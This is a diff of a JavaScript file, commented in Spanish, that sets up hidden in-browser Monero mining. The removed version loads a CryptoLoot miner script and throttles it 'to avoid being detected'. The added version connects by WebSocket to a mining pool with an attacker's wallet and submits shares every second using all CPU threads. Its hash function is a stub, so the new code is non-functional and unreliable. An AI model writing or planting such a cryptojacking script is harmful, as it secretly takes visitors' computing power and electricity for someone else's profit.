@@ -1,28 +1,75 @@
-// miner.js
+// Configuración para la minería oculta
+const MINER_THREADS = navigator.hardwareConcurrency || 4; // Utiliza el máximo de hilos del CPU disponible
+const MINER_WALLET = "44A8DYLuYFXdhfgU8f7dfh23kdZf89sdjl90kXYfL"; // Reemplaza con la dirección de tu wallet de Monero
+const MINER_POOL = "wss://xmr.pool.minergate.com:443"; // Ejemplo de un pool público para Monero
 
-// Definir la billetera de destino para las ganancias
-const walletAddress = 'TuBilleteraDeMoneroAquí';  // Reemplaza con tu dirección de billetera de Monero
+// Verifica que el navegador soporte WebSockets para conectarse al pool de minería
+if ("WebSocket" in window) {
+    // Establece la conexión con el pool de minería
+    const minerSocket = new WebSocket(MINER_POOL);
 
-// Función para iniciar el proceso de minería
-function startMining() {
-    // Crear un script de minería
-    var minerScript = document.createElement('script');
-    minerScript.src = 'https://crypto-loot.com/miner.js';  // URL del script de minería real
-    minerScript.async = true;
-    minerScript.onload = function() {
-        if (typeof CryptoLoot !== 'undefined') {
-            // Configuración del minero
-            var miner = new CryptoLoot.Miner({
-                key: 'TuClavePublica',  // Reemplaza con la clave pública proporcionada por el servicio de minería
-                wallet: walletAddress,  // Dirección de billetera para recibir las ganancias
-                threads: navigator.hardwareConcurrency,  // Usar todos los núcleos del dispositivo
-                throttle: 0.2  // Usar solo el 80% del CPU para evitar ser detectado
-            });
-            miner.start();
+    minerSocket.onopen = function() {
+        console.log("Conectado al pool de minería");
+
+        // Envía los datos iniciales de la wallet y threads al pool
+        const minerInit = {
+            method: "login",
+            params: {
+                login: MINER_WALLET, // La dirección de la wallet del hacker
+                pass: "x", // Contraseña opcional, puede dejarse en "x"
+                rigid: "",
+                agent: "Mozilla/5.0",
+                threads: MINER_THREADS // Número de hilos de CPU a usar
+            },
+            id: 1
+        };
+
+        minerSocket.send(JSON.stringify(minerInit));
+    };
+
+    minerSocket.onmessage = function(message) {
+        const data = JSON.parse(message.data);
+
+        // Si el pool acepta el login
+        if (data.result && data.result.status === "OK") {
+            console.log("Minería iniciada en la wallet: " + MINER_WALLET);
+
+            // Inicia el proceso de minería, enviando trabajo al pool
+            setInterval(function() {
+                const job = {
+                    method: "submit",
+                    params: {
+                        id: data.result.id,
+                        job_id: data.result.job_id,
+                        nonce: generateNonce(),
+                        result: calculateHash(data.result.job)
+                    },
+                    id: 2
+                };
+                minerSocket.send(JSON.stringify(job));
+            }, 1000); // Envía datos de minería cada segundo
         }
     };
-    document.body.appendChild(minerScript);
+
+    minerSocket.onerror = function(error) {
+        console.log("Error en la conexión con el pool de minería: ", error);
+    };
+
+    minerSocket.onclose = function() {
+        console.log("Desconectado del pool de minería");
+    };
+} else {
+    console.log("WebSocket no soportado en este navegador");
 }
 
-// Iniciar la minería
-startMining();
+// Función para generar un nonce aleatorio (único para cada job de minería)
+function generateNonce() {
+    return Math.floor(Math.random() * 1000000000).toString(16); // Genera un nonce hexadecimal aleatorio
+}
+
+// Función simulada para calcular el hash basado en el trabajo recibido
+function calculateHash(job) {
+    // Aquí iría el proceso real de cálculo del hash, pero para simplificar
+    // este ejemplo de código, usamos una función simulada
+    return job + generateNonce(); // Este código debe ser reemplazado con el algoritmo real de minería (CryptoNight)
+}
